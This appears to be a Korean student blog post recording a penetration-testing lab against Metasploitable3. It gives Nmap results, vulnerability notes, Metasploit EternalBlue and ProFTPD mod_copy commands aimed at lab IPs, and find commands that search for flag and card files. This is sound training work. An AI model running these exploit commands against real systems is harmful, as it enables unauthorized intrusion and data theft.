---
title: Nmap 포트 스캔 결과 - Metasploitable3
date: 2026-05-25
categories:
  - project
comments: true
tags:
  - 모의해킹
---
---
![](../../assets/images/Project/2026-05-25-nmap-portscan/시스템모의침투보고서_장준혁2.docx)


**Windows**
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
22/tcp    open  ssh          OpenSSH 7.1 (protocol 2.0)
80/tcp    open  http         Microsoft IIS httpd 7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1
3000/tcp  open  http         WEBrick httpd 1.3.1 (Ruby 2.3.3 (2016-11-21))
3306/tcp  open  mysql        MySQL 5.5.20-log
3389/tcp  open  tcpwrapped
4848/tcp  open  ssl/http     Oracle Glassfish Application Server 4.0
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0
8022/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
8080/tcp  open  http         Sun GlassFish Open Source Edition 4.0
9200/tcp  open  http         Elasticsearch REST API 1.1.1

OS: Windows Server 2008 R2 Standard SP1


**Linux**
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
80/tcp   open   http        Apache httpd 2.4.7
445/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu
631/tcp  open   ipp         CUPS 1.7
3306/tcp open   mysql       MySQL (unauthorized)
8080/tcp open   http        Jetty 8.1.7.v20120910

OS: Ubuntu Linux (Kernel 3.2 ~ 4.14)


2.1 Nmap 스캔 결과

Windows 대상 스캔 결과 총 14개 포트 확인
Linux 대상 스캔 결과 총 7개 포트 확인

Windows
- OpenSSH 7.1      → 구버전, 취약점 존재
- IIS 7.5          → MS15-034 RCE 가능
- SMB 445          → MS17-010 가능
- ManageEngine 8022 → RCE 취약점 존재
- Elasticsearch 1.1.1 → 구버전, RCE 가능
- Ruby on Rails 2.3.3 → 구버전, 취약점 존재

Linux
- ProFTPD 1.3.5    → CVE-2015-3306 존재
- Apache 2.4.7     → 구버전
- Drupal           → Drupalgeddon 가능
- Samba 4.3.11     → 취약점 존재


use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.31
set LHOST 10.0.0.X  (Kali IP)
run

성공시 → whoami 입력 → 스크린샷

use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 10.0.0.51
set SITEPATH /var/www/html
run

성공시 → id 입력 → 스크린샷


find / -type f -iname "*flag*" 2>/dev/null
find / -type f -iname "*card*" 2>/dev/null


- msfconsole 모듈 설정 화면
- run 실행 후 성공 화면
- whoami / id 결과
- 플래그 발견 화면
